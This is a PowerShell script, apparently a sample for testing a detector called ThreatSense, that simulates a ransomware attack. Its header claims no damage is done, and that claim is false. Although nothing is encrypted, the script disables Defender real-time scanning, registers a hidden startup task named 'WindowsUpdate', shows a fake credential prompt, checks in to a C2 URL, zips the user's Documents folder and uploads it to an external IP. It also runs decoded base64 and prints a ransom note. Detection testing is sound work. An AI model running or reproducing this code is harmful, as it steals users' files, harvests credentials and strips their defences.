# Ransomware Simulation Script - FOR TESTING ONLY
# This file contains suspicious patterns that ThreatSense should detect
# No actual encryption or damage is performed

$c2 = "http://ransomware-c2.darknet.ru:8443/gate"
$exfil = "http://193.42.11.23:9090/upload"
$bitcoin = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"

# Encoded payload (base64 of harmless string for demo)
$encoded = "V3JpdGUtSG9zdCAiVGhpcyBpcyBhIGRlbW8i"
$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
Invoke-Expression $decoded

# Simulate file enumeration
$targets = Get-ChildItem -Path "$env:USERPROFILE\Documents" -Recurse -Include *.docx, *.xlsx, *.pdf, *.jpg
Write-Host "[*] Found $($targets.Count) target files"

# Simulate persistence via scheduled task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File $PSScriptRoot\update.ps1"
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger (New-ScheduledTaskTrigger -AtStartup)

# Simulate AV evasion
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "$env:TEMP"

# Simulate credential harvesting
$creds = Get-Credential -Message "Windows Security Update Required"

# Simulate network reconnaissance
$hosts = 1..254 | ForEach-Object { Test-Connection -ComputerName "192.168.1.$_" -Count 1 -Quiet }
Invoke-WebRequest -Uri $c2 -Method POST -Body "checkin|$env:COMPUTERNAME"

# Simulate data staging
Compress-Archive -Path "$env:USERPROFILE\Documents\*" -DestinationPath "$env:TEMP\backup.zip"
Invoke-WebRequest -Uri $exfil -Method POST -InFile "$env:TEMP\backup.zip"

# Ransom note
$note = @"
YOUR FILES HAVE BEEN ENCRYPTED
Send 0.5 BTC to: $bitcoin
Contact: recovery@darkmail.onion
"@
Write-Host $note

Write-Host "`n[*] ThreatSense Demo - Simulated Ransomware (NOT REAL)"
Write-Host "[*] No actual encryption or damage performed"
